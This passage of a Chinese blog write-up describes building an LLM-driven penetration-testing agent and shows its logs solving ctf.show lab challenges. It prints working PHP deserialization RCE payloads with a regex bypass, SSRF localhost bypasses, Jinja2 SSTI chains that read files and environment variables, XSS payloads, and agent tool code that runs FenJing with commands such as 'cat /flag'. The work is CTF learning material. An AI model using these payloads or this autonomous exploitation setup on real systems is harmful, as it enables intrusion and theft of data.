---- 正在执行工具: web_request 参数: {'url': 'http://cceb166f-3c02-4736-9f37-f95b51a0b39a.challenge.ctf.show', 'method': 'GET', 'params': {'username': 'test', 'password': 'test'}, 'cookies': {'user': 'O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A55%3A%22echo+shell_exec%28%22find+%2F+-name+%5C%22%2Aflag%2A%5C%22+2%3E%2Fdev%2Fnull%22%29%3B%22%3B%7D%7D'}} ---
---- 正在执行工具: php_run 参数: {'expr': 'class ctfShowUser {\n    private $username=\'xxxxxx\';\n    private $password=\'xxxxxx\';\n    private $isVip=false;\n    private $class = \'info\';\n    \n    public function __construct(){\n        $this->class=new backDoor();\n    }\n}\n\nclass backDoor {\n    private $code = \'echo file_get_contents("/var/www/html/flag.php");\';\n}\n\n$obj = new ctfShowUser();\necho urlencode(serialize($obj));'} ---
              ---- 正在执行工具: web_request 参数: {'url': 'http://cceb166f-3c02-4736-9f37-f95b51a0b39a.challenge.ctf.show', 'method': 'GET', 'params': {'username': 'test', 'password': 'test'}, 'cookies': {'user': 'O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A49%3A%22echo+file_get_contents%28%22%2Fvar%2Fwww%2Fhtml%2Fflag.php%22%29%3B%22%3B%7D%7D'}} ---
---- 正在执行工具: php_run 参数: {'expr': 'class ctfShowUser {\n    private $username=\'xxxxxx\';\n    private $password=\'xxxxxx\';\n    private $isVip=false;\n    private $class = \'info\';\n    \n    public function __construct(){\n        $this->class=new backDoor();\n    }\n}\n\nclass backDoor {\n    private $code = \'echo shell_exec("cat /tmp/flag.sh 2>/dev/null");\';\n}\n\n$obj = new ctfShowUser();\necho urlencode(serialize($obj));'} ---
---- 正在执行工具: web_request 参数: {'url': 'http://cceb166f-3c02-4736-9f37-f95b51a0b39a.challenge.ctf.show', 'method': 'GET', 'params': {'username': 'test', 'password': 'test'}, 'cookies': {'user': 'O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A48%3A%22echo+shell_exec%28%22cat+%2Ftmp%2Fflag.sh+2%3E%2Fdev%2Fnull%22%29%3B%22%3B%7D%7D'}} ---
```

来看看他自己总结的这次整个流程：

```
### 漏洞分析总结：

1. **反序列化入口**：`unserialize($_COOKIE['user'])`，位于主脚本中，需要同时传入 `username` 和 `password` GET参数触发。

2. **可控数据来源**：`$_COOKIE['user']` 直接传入 `unserialize`，没有任何过滤或验证。

3. **POP链分析**：
   - `ctfShowUser::__destruct()` 调用 `$this->class->getInfo()`
   - `backDoor::getInfo()` 包含 `eval($this->code)` 可作为RCE的sink
   - 利用链：`__destruct()` → `getInfo()` → `eval()`

4. **利用过程**：
   - 构造 `ctfShowUser` 对象，其 `$class` 属性指向 `backDoor` 对象
   - 设置 `backDoor` 对象的 `$code` 属性为要执行的PHP代码
   - 通过Cookie传入序列化字符串，触发反序列化实现RCE

5. **Payload构造**：
   ```php
   class ctfShowUser {
       private $username='xxxxxx';
       private $password='xxxxxx';
       private $isVip=false;
       private $class = 'info';
       
       public function __construct(){
           $this->class=new backDoor();
       }
   }
   
   class backDoor {
       private $code = 'echo file_get_contents("/var/www/html/flag.php");';
   }
```

6. **最终利用**：通过读取 `/var/www/html/flag.php` 文件获取到flag。
```

最后还有个过滤，再尝试过后，用的```echo file_get_contents("/var/www/html/flag.php")```对cat过滤进行的绕过



### web258 php反序列化 困难加强

<img src="assets/image-20260205180359355.png" alt="image-20260205180359355" style="zoom:50%;" />

可以看到这里有过滤：正则过滤[oc]是匹配o字符或者c字符，\d匹配一个数字字符，等价于[0-9]，+号是匹配前面的\d一次或者多次

这道题其他的地方和上道题思路基本相似，pop链

```
**backdoor::getinfo<--ctfShowUser::destruct<--ctfShowUser::construct**
```



 规矩还是来看看整个过程工具的调用情况吧

![image-20260205180609127](assets/image-20260205180609127.png)



看一下他拿flag的整个流程：

1. **反序列化入口**：`unserialize($_COOKIE['user'])`，当GET参数 `username` 和 `password` 都存在时触发

2. **过滤绕过**：正则过滤 `/[oc]:\d+:/i` 可以通过 `O:+数字:` 绕过（例如 `O:+11:`）
3. **POP 链**：
   - `ctfShowUser::__destruct()` → `$this->class->getInfo()`
   - `backDoor::getInfo()` → `eval($this->code)`
4. **利用方法**：构造 `ctfShowUser` 对象，其 `class` 属性指向 `backDoor` 对象，`backDoor->code` 包含恶意 PHP 代码

**利用步骤：**

1. 使用 `php_run` 生成序列化 payload
2. 将 `O:数字:` 替换为 `O:+数字:` 绕过正则过滤
3. 对序列化字符串进行 URL 编码
4. 通过 Cookie 发送 payload

```

### 第五关 SSRF 

#### 限制域名长度小于5

web355

<img src="https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260206205848966.png" alt="image-20260206205848966" style="zoom:50%;" />

限制了域名长度小于5，没有其他限制



这次根据ssrf，简单换了提示词

```py
 sys_msg = SystemMessage(
        content=(
            summary_prefix
            + "你是 SSRF 渗透测试助手。工具：nmap_scan、dirsearch_scan、read_web_file、web_request、sqlmap_scan。\n"
            "目标：定位能触发服务器端请求的入口，并通过 `web_request` 验证。注意：所有真实请求必须用 `web_request` 执行，不要在文本中伪造响应。\n"
            "建议流程：先用 `read_web_file` 审计源码找可控参数，再用 `web_request` 访问内网地址或可控 OOB 域进行验证。\n"
        ),
    )
```

直接秒杀
看一下llm的总结：

```
## 最终结论

经过全面的SSRF渗透测试分析，我成功发现了目标网站存在的SSRF漏洞并获取了flag。

### 漏洞详情：

1. **漏洞位置**：POST参数 `url`
2. **漏洞类型**：服务器端请求伪造（SSRF）
3. **触发条件**：
   - URL的scheme必须是http或https
   - 主机名长度必须≤5个字符
4. **利用方法**：使用短主机名（如`0`、`127.1`）指向本地主机，然后访问内部服务的特定路径

### 攻击过程：

1. 通过源码审计发现SSRF漏洞存在于POST参数`url`中
2. 验证漏洞存在，确认`http://0`和`http://127.1`都能成功访问本地主机
3. 通过访问`http://127.1:80/flag.php`成功获取flag

### 发现的Flag：
`ctfshow{490498df-ad42-4754-8b1d-8fed06a30c48}`
```

#### web358

![image-20260206212522088](https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260206212522088.png)



这题也直接秒了

```
让我解释一下这个SSRF绕过技术：

1. **URL结构分析**：`http://ctf.@127.0.0.1/flag.php?.show`
   - `http://ctf.` - 满足正则表达式开头要求
   - `@127.0.0.1` - 用户信息部分，指定目标主机为127.0.0.1
   - `/flag.php?` - 路径和查询字符串开始
   - `.show` - 满足正则表达式结尾要求

2. **parse_url() 行为**：`parse_url()` 会正确解析这个URL：
   - scheme: `http`
   - host: `127.0.0.1` (用户信息 `ctf.` 被忽略)
   - path: `/flag.php`
   - query: `.show` (实际上应该是空查询，但 `.show` 被当作查询参数)

3. **正则匹配**：整个字符串 `http://ctf.@127.0.0.1/flag.php?.show` 匹配正则 `/^http:\/\/ctf\..*show$/i`

4. **实际请求**：`file_get_contents()` 实际请求的是 `http://127.0.0.1/flag.php?`，成功访问到了本地的 `flag.php` 文件。

## 最终结论

**SSRF漏洞确认**：目标网站存在严重的服务器端请求伪造（SSRF）漏洞。

**漏洞位置**：`POST /` 的 `url` 参数

**漏洞详情**：
1. 代码使用 `preg_match('/^http:\/\/ctf\..*show$/i', $url)` 进行URL格式验证
2. 验证通过后直接使用 `file_get_contents($url)` 获取URL内容
3. 虽然使用了 `parse_url()` 但没有对解析结果进行安全检查

**利用方式**：通过构造 `http://ctf.@127.0.0.1/flag.php?.show` 格式的URL，可以绕过正则检查并访问内网服务

**获取的Flag**：`ctfshow{de6ecd2d-67e5-4204-98b7-7d82d75c0bfe}`
```



### 第六关 SSTI

#### 简单

web361

没有任何过滤

我们来看一下我们的agent有没有具备构造ssti payload的能力

首先看一下工具调用流

read_web_file读取网页获取信息后，反复构造payload并使用web_request发包进行尝试

![image-20260206214903624](https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260206214903624.png)



可以研究一下agent的整个思考过程：

````
### 1. **漏洞确认**
- **目标URL**: `http://3dec000b-67f7-47f2-9f9d-53bd0f82fede.challenge.ctf.show/`
- **漏洞类型**: Server-Side Template Injection (SSTI)
- **模板引擎**: Flask/Jinja2
- **注入点**: `name` GET参数

### 2. **漏洞详情**
从源码分析可见：
```python
template = '''
{%% block body %%}
    <div class="center-content error">
        <h1>Hello</h1>
        <h3>%s</h3>
    </div> 
{%% endblock %%}
''' % (request.args.get('name'))
return render_template_string(template)
```
- 用户输入的`name`参数直接通过`%s`格式化字符串插入到模板中
- 然后使用`render_template_string()`渲染，导致SSTI漏洞

### 3. **发现的Flag**
通过payload `{{config}}`直接获取到：
- **Flag**: `flag{SSTI_123456}`
- 位置：Flask应用的SECRET_KEY配置中

### 4. **漏洞利用验证**
已验证以下利用方式：
1. **基本表达式执行**: `{{7*7}}` → 返回49
2. **配置信息泄露**: `{{config}}` → 泄露包括flag在内的所有配置
3. **文件读取**: 成功读取`/etc/passwd`和`app.py`源码
4. **命令执行**: 通过subprocess.Popen执行系统命令

### 5. **系统信息**
- Web服务器: nginx/1.20.1
- 应用框架: Flask (Python)
- 操作系统: Linux (Ubuntu/Debian系)
- Python版本: 3.8
````





接着再来尝试一点难的吧

#### 过滤引号

web363

正常做法是使用request.args进行绕过

来看一下，他的整个攻击思路
````
### 漏洞详情：
1. **目标URL**: `http://568c4607-085e-40f4-a88e-e82164432810.challenge.ctf.show/`
2. **注入点**: `name` GET参数
3. **模板引擎**: Flask/Jinja2
4. **过滤规则**: 单引号和双引号被过滤（返回":("），但可以通过其他方式绕过

### 利用过程：
1. 确认SSTI存在：`{{7*7}}` 返回 `49`
2. 确认Flask环境：`{{config}}` 返回Flask配置信息
3. 绕过引号过滤：使用`().__class__.__base__.__subclasses__()`获取所有类
4. 找到`os._wrap_close`类（索引132）
5. 通过该类访问os模块的全局变量
6. 读取环境变量获取flag

### 最终Payload：
```
{{().__class__.__base__.__subclasses__()[132].__init__.__globals__.environ.FLAG}}
```
````

直接读取的environ.FLAG环境变量



```py
sys_msg = SystemMessage(
    content=(
        summary_prefix
        + "你是 SSTI（Server-Side Template Injection）渗透测试助手。"
        "工具：nmap_scan、dirsearch_scan、read_web_file、web_request、sqlmap_scan、fenjing_ssti(基于本地 FenJing)。\n"
        "当已经确认或高度怀疑为 Jinja2 SSTI 时，应**优先使用 `fenjing_ssti` 对目标 URL 进行自动化扫描与利用**。\n"
        "**fenjing_ssti 调用规则**：传入基础 URL（不含查询参数），例如 `https://xxx.challenge.ctf.show/`，"
        "让 FenJing 自己发现并 fuzz 参数；优先使用 HTTPS（尤其是 ctf.show 域名）。"
        "除非已通过源码审计明确知道某个可控参数名，否则不要传入带 `?param=value` 的完整 URL。"
        "本工具通过 --exec-cmd 非交互执行，默认 exec_cmd='ls /'；若需读取 flag 可传入 exec_cmd='cat /flag' 等。\n"
        "在 FenJing 自动化利用前，可先用 `read_web_file` 审计模板与控制器源码找可控变量与渲染函数，或用 `web_request` 进行手工探测与确认，再结合 FenJing 结果构造更精细的利用链。\n"
    ),
)
```



#### 工具fenjing_ssti

这里换了提示词，还加了fenjing工具，便于当llm解决不了的直接上大杀器解决

```py
"""调用 FenJing 对目标 URL 做 Jinja2 SSTI 扫描（极简封装）。"""
import subprocess
from urllib.parse import urlparse, urlunparse

from langchain_core.tools import tool


def _normalize_url_for_fenjing(url: str) -> str:
    """
    规范 URL 供 FenJing 使用：
    - 去除查询参数（?xxx），让 FenJing 自己发现并 fuzz 参数
    - 对 ctf.show 等挑战域名优先使用 HTTPS
    """
    url = (url or "").strip()
    if not url.startswith(("http://", "https://")):
        return url
    parsed = urlparse(url)
    #  strip query and fragment
    base = urlunparse((parsed.scheme, parsed.netloc, parsed.path.rstrip("/") or "/", "", "", ""))
    # ctf.show 等挑战站点优先 HTTPS
    if "ctf.show" in parsed.netloc.lower() and parsed.scheme == "http":
        base = base.replace("http://", "https://", 1)
    return base


@tool
def fenjing_ssti(
    target_url: str,
    exec_cmd: str = "ls /",
    timeout: int = 300,
) -> str:
    """
    使用 FenJing 自动检测目标 URL 是否存在 Jinja2 模板注入 (SSTI) 漏洞。
    传入基础 URL（不含查询参数）即可，FenJing 会自动发现并 fuzz 参数。
    本工具会自动：去除 URL 中的 ?xxx 查询串；对 ctf.show 域名使用 HTTPS。
    扫描成功后通过 --exec-cmd 直接执行指定命令并退出，避免进入交互模式。
    内部执行: python -m fenjing scan -u "<target_url>" --no-verify-ssl -e "<exec_cmd>"
    """
    url = (target_url or "").strip()
    if not url.startswith(("http://", "https://")):
        return "错误: target_url 必须以 http:// 或 https:// 开头"

    url = _normalize_url_for_fenjing(url)
    cmd = ["python", "-m", "fenjing", "scan", "-u", url, "--no-verify-ssl", "-e", exec_cmd]

    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
    except FileNotFoundError:
        return (
            "错误: 运行失败。请确认本机可执行 `python -m fenjing --help`，"
            "并确保已安装 FenJing（例如 `pipx install fenjing` 或在当前 Python 环境 pip 安装）。"
        )
    except subprocess.TimeoutExpired:
        return f"错误: FenJing 执行超时(>{timeout} 秒)，请减少任务复杂度或增大 timeout。"
    except Exception as e:
        return f"错误: 调用 FenJing 失败: {e}"

    stdout = (proc.stdout or "").strip()
    stderr = (proc.stderr or "").strip()

    # 给 LLM 一个非常稳定的结构化输出
    out = [f"[cmd] {' '.join(cmd)}", f"[exit_code] {proc.returncode}"]
    if stdout:
        out.append("[stdout]\n" + stdout)
    if stderr:
        out.append("[stderr]\n" + stderr)
    return "\n\n".join(out)


```

agent在使用本工具时只需要传入url和想要执行的命令即可

![image-20260207145551913](https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260207145551913.png)



### 第七关 XSS

#### 无过滤反射型

web316

![image-20260208152135336](https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260208152135336.png)

没有任何过滤，先拿这道题调试一下agent

这里就以成功弹窗作为成功通关



首先遇到的第一个问题就是，是否触发弹窗，只用http请求无法知道

所以这里使用Playwright作为辅助，制作了一个专门发包和检测xss的工具

**Playwright** 是一个由微软（Microsoft）开发的**开源自动化测试和网页采集工具**，它允许程序员编写代码来模拟人类在浏览器中的操作，比如点击按钮、填写表单、在页面间跳转、截图，甚至处理复杂的单页应用

#### 工具check_xss

```py
"""使用无头浏览器打开 URL，执行 JS，探测是否出现 alert 弹窗且内容为 success。"""
from langchain_core.tools import tool


@tool
def check_xss(url: str, wait_ms: int = 3000):
    """
    在真实浏览器中打开 URL，执行页面 JavaScript，探测是否弹出 alert 且内容为 success。
    - url: 完整地址（可带 XSS payload 的查询参数或 hash），例如 https://example.com/page?q=<script>alert('success')</script>
    - wait_ms: 打开页面后等待多少毫秒再判定（用于等待延迟触发的 alert），默认 3000。
    返回 JSON：alert_detected 为 true 表示探测到内容为 success 的 alert；message 为实际弹窗文字；error 为异常信息。
    """
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        return {
            "alert_detected": False,
            "message": None,
            "error": "未安装 playwright，请执行: pip install playwright && playwright install chromium",
        }

    captured_message: list = []  # 用 list 以便在闭包中修改

    def on_dialog(dialog):
        captured_message.append(dialog.message)
        dialog.accept()

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(
                ignore_https_errors=True,
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            )
            page = context.new_page()
            page.on("dialog", on_dialog)
            page.goto(url, wait_until="domcontentloaded", timeout=15000)
            page.wait_for_timeout(wait_ms)
            browser.close()

        msg = captured_message[0] if captured_message else None
        return {
            "alert_detected": msg is not None and msg.strip() == "success",
            "message": msg,
            "error": None,
        }
    except Exception as e:
        return {
            "alert_detected": False,
            "message": None,
            "error": str(e),
        }
```



注意这里的提示词也要适当修改一下，在这里可以适当给agent写一个知识文档给他

```py
sys_msg = SystemMessage(
    content=(
        summary_prefix
        + "你是**XSS（跨站脚本）**渗透测试助手，专门负责发现、测试和验证 Web 应用中的反射型/存储型 XSS。\n"
        "可用工具：nmap_scan、dirsearch_scan、read_web_file、web_request、check_xss。\n"
        "**web_request 与弹窗无关**：web_request 只返回 HTTP 响应体（HTML 文本），**不执行 JavaScript**，因此**无法判断是否会发生 alert 弹窗**。是否弹窗只能由 **check_xss** 在真实浏览器中打开 URL 并执行 JS 来探测。\n"
        "流程建议：用 dirsearch_scan/read_web_file 发现页面与输入点；构造带 payload 的 URL 后**直接对该 URL 调用 check_xss** 验证是否弹窗。不要为“看是否弹窗”而反复调用 web_request——应每次构造候选 URL 后优先调用 check_xss(该 URL)，以 check_xss 的 alert_detected 为准。web_request 仅用于必要时查看接口或页面结构，不能替代 check_xss。\n"
        "**web_request 的 method 只允许 GET 或 POST**，禁止使用 OPTIONS、HEAD、PUT、DELETE 等其它方法。\n"
        "\n"
        "**XSS 测试要点**：\n"
        "- 识别反射/存储点：URL 参数、表单字段、Cookie、HTTP 头在响应中的出现位置与上下文。\n"
        "- 根据上下文选择 payload：目标为触发 alert('success') 或 alert(\"success\")。标签内用 <script>alert('success')</script>、<img onerror=alert('success')>、<svg onload=alert('success')> 等；属性内可闭合属性再写事件；在 JS 字符串内考虑闭合引号、\\ 等。\n"
        "- 常见绕过：大小写、编码（HTML 实体、Unicode、JS 编码）、双写、换行/空格、短标签、事件名变体。\n"
        "- 验证方式：只有 **check_xss(url)** 能探测是否弹窗；web_request 探测不到。**每构造一个候选 URL 就调用 check_xss(该 URL)**，根据 alert_detected 判断成功。\n"
        "**结束条件**：当 `check_xss` 返回 alert_detected 为 true 时，**立即给出「XSS 利用成功，已探测到 alert(success) 弹窗」并结束**；若已覆盖主要输入点与常见 payload 且多次 check_xss 均为 false，则给出最终结论并结束。\n"
    ),
)
```



看一下整个利用过程：

```
## XSS 利用成功！

**目标URL**: `http://5a5fe95d-7126-475d-ae61-9097fbc678d0.challenge.ctf.show/`

**漏洞类型**: 反射型XSS

**输入点**: URL参数 `msg`

**输出位置**: 页面底部，`<hr class="layui-bg-gray">` 标签之后

**过滤情况**: 无任何过滤或编码，用户输入直接插入到HTML中

**验证payloads**:
1. `http://5a5fe95d-7126-475d-ae61-9097fbc678d0.challenge.ctf.show/?msg=<script>alert('success')</script>` -  成功
2. `http://5a5fe95d-7126-475d-ae61-9097fbc678d0.challenge.ctf.show/?msg=<img src=x onerror=alert('success')>` -  成功  
3. `http://5a5fe95d-7126-475d-ae61-9097fbc678d0.challenge.ctf.show/?msg=<svg onload=alert('success')>` -  成功
```

#### 过滤img和script

web318

可以看到，agent检测到注入点后，又检测到存在过滤，接着反复尝试可能的payload

![image-20260208154744565](https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260208154744565.png)

#### 过滤又加上空格

web322

当过滤变得多了过后，这次尝试发现agent根据自己的知识进行胡乱的猜测过滤了什么



在这里突然想到，既然agent在这方面的知识储备有限，拿可以直接引入知识库的概念来辅助agent尝试成功，这里没有用rag来做知识库，我这里仅仅针对不同漏洞，注入xss，sql注入，命令执行等等写了技术文档，在此之上增加来一个阅读技术文档的工具可以供agent在有需要的时候进行自助调用

#### 工具read_doc

```py
"""根据漏洞类型读取项目内技术文档（防御与绕过），供 Agent 在识别到对应题型时调用。"""
from pathlib import Path

from langchain_core.tools import tool

# 项目根目录（tools 的上级）
_PROJECT_ROOT = Path(__file__).resolve().parent.parent
_TECH_DOCS_DIR = _PROJECT_ROOT / "tech_docs"

# 漏洞类型 -> 文档文件名
_VULN_DOC_MAP = {
    "sql": "sql_injection.md",
    "sql_injection": "sql_injection.md",
    "xss": "xss.md",
    "php_deserialize": "php_deserialization.md",
    "php_deserialization": "php_deserialization.md",
    "php": "php_deserialization.md",
    "ssrf": "ssrf.md",
    "rce": "command_execution.md",
    "command_execution": "command_execution.md",
    "cmd": "command_execution.md",
    "命令执行": "command_execution.md",
}


@tool
def read_doc(vuln_type: str):
    """
    读取指定漏洞类型的技术文档（常见防御与绕过手段）。
    vuln_type: 漏洞类型，可选：sql / xss / php_deserialize / ssrf / rce（或 sql_injection、command_execution、命令执行 等别名）。
    当识别到题目属于某类漏洞时调用此工具，再根据文档内容进行测试。
    """
    key = vuln_type.strip().lower()
    filename = _VULN_DOC_MAP.get(key)
    if not filename:
        supported = "、".join(sorted(set(_VULN_DOC_MAP.keys())))
        return f"未找到类型「{vuln_type}」的文档。支持的类型：{supported}"
    path = _TECH_DOCS_DIR / filename
    if not path.is_file():
        return f"文档文件不存在: {path}"
    try:
        return path.read_text(encoding="utf-8")
    except Exception as e:
        return f"读取文档失败: {e}"
```





这样一来，想到之前还是个ctf小白时写的几十万字的wp在这个时候就派上用场了，当然由于上下文的限制，技术文档的内容必须精简切直切要害，想要实现几十万字的wp做知识库，还是需要rag技术，这个之后再来实现吧，现在的这个方法够用啦



我们一起来看看整个渗透流程吧

![image-20260208163531134](https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260208163531134.png)

![image-20260208163623943](https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260208163623943.png)



## 总结

整个项目还有很多待完善的地方，这里只为了解决不同漏洞写出了对应agent可以调用的工具，现在的这个agent只能每次处理单个问题，至于怎么把整个渗透测试过程（从信息收集到...）连起来还是个很大的工程，目前的开源项目里暂时没看到有实现的，我的这个项目也是从0开始学开始做的，肯定有很多地方有待完善，值得一提的是，目前我们把这些在渗透测试过程中可能会用到的工具实现了，算是给后来的师傅提供一些解决思路，如果师傅们感兴趣的话，项目源码可以到github自取
